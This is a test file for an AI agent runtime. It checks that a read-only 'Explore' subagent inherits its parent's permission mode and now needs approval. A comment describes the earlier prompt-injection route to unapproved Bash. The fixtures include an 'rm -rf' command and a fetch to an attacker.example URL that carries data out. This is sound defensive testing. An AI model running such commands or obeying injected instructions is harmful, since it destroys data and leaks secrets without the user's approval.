import { describe, expect, it } from "vitest";
import {
  createSessionId,
  type CollaborationMode,
  type ExecutionPort,
  type HttpClientPort,
  type PermissionBrokerRequest,
} from "@nibi/contracts";
import { PermissionService, defaultPermissionConfig } from "../src/permission/service.js";
import { createTestAgentRuntime } from "./test-agent-runtime.js";
import { createTestModelFactory } from "./test-runtime-model.js";
import { createTestSessionEventStore } from "./test-event-store.js";

// 修复原因：内置 Explore 曾固定以 yolo 和独立权限服务运行，只靠 prompt 约束只读；提示注入后
// 模型可经 Agent(Explore) 在 build 或 Plan 父会话下免审批执行任意 Bash。现在继承父会话模式与 Plan 状态。
type ChildToolCall =
  | { name: "Bash"; input: { command: string } }
  | {
      name: "WebFetch";
      input: { url: string; prompt: string };
    };

async function runExploreChild(input: {
  mode: CollaborationMode;
  planEnabled?: boolean;
  call: ChildToolCall;
  permissionService?: PermissionService;
}) {
  const executedCommands: string[] = [];
  const fetchedUrls: string[] = [];
  const requests: PermissionBrokerRequest[] = [];
  const childToolResults: string[] = [];
  const childRequests: string[] = [];
  let mainCalls = 0;
  let childCalls = 0;
  const executionPort: ExecutionPort = {
    async run(request) {
      executedCommands.push(JSON.stringify(request.command));
      const now = new Date();
      return {
        status: "completed",
        exitCode: 0,
        stdout: { text: "ok", bytes: 2, truncated: false },
        stderr: { text: "", bytes: 0, truncated: false },
        durationMs: 1,
        timedOut: false,
        cancelled: false,
        startedAt: now,
        completedAt: now,
      };
    },
  } as ExecutionPort;
  const body = new TextEncoder().encode("<html><body>page</body></html>");
  const httpClientPort: HttpClientPort = {
    async request(request) {
      fetchedUrls.push(request.url);
      return {
        body,
        bytes: body.byteLength,
        durationMs: 1,
        headers: { "content-type": "text/html; charset=utf-8" },
        status: 200,
        statusText: "OK",
        url: request.url,
      };
    },
  };
  const runtime = createTestAgentRuntime(
    createSessionId(`explore-permission-${input.mode}-${input.planEnabled ? "plan" : "base"}`),
    {
      mode: input.mode,
      ...(input.planEnabled ? { planEnabled: true } : {}),
      workingDirectory: "/workspace/explore-permission",
      bashShellSelection: { dialect: "posix", source: "auto-detected", display: { name: "bash" } },
    },
    {
      eventStore: createTestSessionEventStore(),
      executionPort,
      httpClientPort,
      ...(input.permissionService ? { permissionService: input.permissionService } : {}),
      permissionBroker: {
        async requestPermission(request) {
          requests.push(request);
          return { decision: "deny", reason: "denied in test" };
        },
      },
      modelFactory: createTestModelFactory({
        async generateText(request, observation) {
          const child =
            (observation.invocationContext?.metadata as { querySource?: string })?.querySource ===
            "subagent";
          const usage = { inputTokens: 1, outputTokens: 1, totalTokens: 2 };
          if (child) {
            childRequests.push(JSON.stringify(request));
            childCalls++;
            if (childCalls === 1)
              return {
                finishReason: "tool-calls",
                text: "",
                usage,
                toolCalls: [{ id: "explore-child-tool", ...input.call }],
              };
            childToolResults.push(JSON.stringify(request));
            return { finishReason: "stop", text: "child done", usage };
          }
          if (++mainCalls === 1)
            return {
              finishReason: "tool-calls",
              text: "",
              usage,
              toolCalls: [
                {
                  id: "explore-agent",
                  name: "Agent",
                  input: { description: "explore", prompt: "explore", subagent_type: "Explore" },
                },
              ],
            };
          return { finishReason: "stop", text: "done", usage };
        },
      }),
    },
  );
  await runtime.executeTurn("explore");
  return { childRequests, childToolResults, executedCommands, fetchedUrls, requests };
}

const WRITE = { name: "Bash", input: { command: "rm -rf fixture" } } as const;
const READ = { name: "Bash", input: { command: "grep -n needle file.txt" } } as const;
const FETCH = {
  name: "WebFetch",
  input: { url: "https://attacker.example/collect?data=secret", prompt: "read" },
} as const;

describe("built-in Explore inherits the parent permission mode", () => {
  it("asks the parent before a non-read-only Bash command under build", async () => {
    const result = await runExploreChild({ mode: "build", call: WRITE });
    expect(result.requests).toHaveLength(1);
    expect(result.requests[0]).toMatchObject({
      mode: "build",
      origin: { kind: "subagent" },
      toolName: "Bash",
    });
    expect(result.executedCommands).toEqual([]);
    expect(result.childToolResults.some((request) => request.includes("denied in test"))).toBe(
      true,
    );
  });

  it("runs read-only Bash without asking under build", async () => {
    const result = await runExploreChild({ mode: "build", call: READ });
    expect(result.requests).toEqual([]);
    expect(result.executedCommands).toHaveLength(1);
  });

  it("asks the parent before WebFetch to a URL that is not preapproved under build", async () => {
    const result = await runExploreChild({ mode: "build", call: FETCH });
    expect(result.requests).toHaveLength(1);
    expect(result.requests[0]).toMatchObject({
      toolName: "WebFetch",
      origin: { kind: "subagent" },
    });
    expect(result.fetchedUrls).toEqual([]);
  });

  it("denies non-read-only Bash under a plan parent without asking", async () => {
    const result = await runExploreChild({ mode: "build", planEnabled: true, call: WRITE });
    expect(result.requests).toEqual([]);
    expect(result.executedCommands).toEqual([]);
    expect(
      result.childToolResults.some((request) =>
        request.includes("Plan mode only allows read-only, non-destructive tools"),
      ),
    ).toBe(true);
  });

  it("gives Explore the read-only plan reminder, not the main plan workflow", async () => {
    const result = await runExploreChild({ mode: "build", planEnabled: true, call: READ });
    expect(result.childRequests[0]).toContain("Plan mode is active.");
    expect(result.childRequests[0]).not.toMatch(/ExitPlanMode|### Phase|Explore agents/);
  });

  it("still runs read-only Bash under a plan parent", async () => {
    const result = await runExploreChild({ mode: "build", planEnabled: true, call: READ });
    expect(result.requests).toEqual([]);
    expect(result.executedCommands).toHaveLength(1);
  });

  it("keeps a yolo parent running Explore Bash without approval", async () => {
    const result = await runExploreChild({ mode: "yolo", call: WRITE });
    expect(result.requests).toEqual([]);
    expect(result.executedCommands).toHaveLength(1);
    expect(result.executedCommands[0]).toContain("rm -rf fixture");
  });

  it("applies the parent's disallowed tools to Explore", async () => {
    const result = await runExploreChild({
      mode: "build",
      call: READ,
      permissionService: new PermissionService({
        ...defaultPermissionConfig,
        disallowedTools: new Set(["Bash"]),
      }),
    });
    expect(result.requests).toEqual([]);
    expect(result.executedCommands).toEqual([]);
  });
});
